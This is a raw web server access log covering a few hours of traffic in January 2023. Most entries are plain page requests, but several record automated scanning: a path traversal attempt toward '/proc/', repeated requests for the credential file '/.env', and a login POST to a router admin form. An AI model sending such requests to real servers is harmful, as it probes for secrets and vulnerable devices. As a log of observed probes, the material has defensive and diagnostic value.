194.180.49.233 - - [15/Jan/2023:22:48:42 -0600] "GET ../../proc/ HTTP" 400 226 "-" "-"
92.118.39.29 - - [15/Jan/2023:22:52:37 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
143.110.222.166 - - [15/Jan/2023:23:11:40 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.254.196.223 - - [15/Jan/2023:23:23:49 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [15/Jan/2023:23:23:51 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
2001:470:1:c84::22d - - [15/Jan/2023:23:43:07 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"
2001:470:1:c84::23d - - [15/Jan/2023:23:46:49 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36"
2001:470:1:c84::222 - - [15/Jan/2023:23:46:54 -0600] "GET /favicon.ico HTTP/1.1" 301 243 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15"
187.102.222.5 - - [15/Jan/2023:23:54:35 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
143.110.222.166 - - [16/Jan/2023:00:07:57 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
179.43.177.242 - - [16/Jan/2023:00:48:22 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
128.199.77.96 - - [16/Jan/2023:01:07:56 -0600] "GET / HTTP/1.0" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0"
143.110.222.166 - - [16/Jan/2023:01:12:45 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
71.6.232.27 - - [16/Jan/2023:01:16:56 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
80.94.92.57 - - [16/Jan/2023:01:34:55 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
109.87.145.32 - - [16/Jan/2023:01:45:08 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
179.43.177.242 - - [16/Jan/2023:01:46:04 -0600] "GET / HTTP/1.1" 301 232 "-" "Hello World"
113.142.141.105 - - [16/Jan/2023:01:58:49 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
143.110.222.166 - - [16/Jan/2023:02:07:03 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.254.196.223 - - [16/Jan/2023:02:25:35 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [16/Jan/2023:02:25:36 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
167.71.227.160 - - [16/Jan/2023:02:32:34 -0600] "\x16\x03\x01" 400 226 "-" "-"
167.71.227.160 - - [16/Jan/2023:02:32:35 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
167.71.227.160 - - [16/Jan/2023:02:32:35 -0600] "\x16\x03\x01" 400 226 "-" "-"
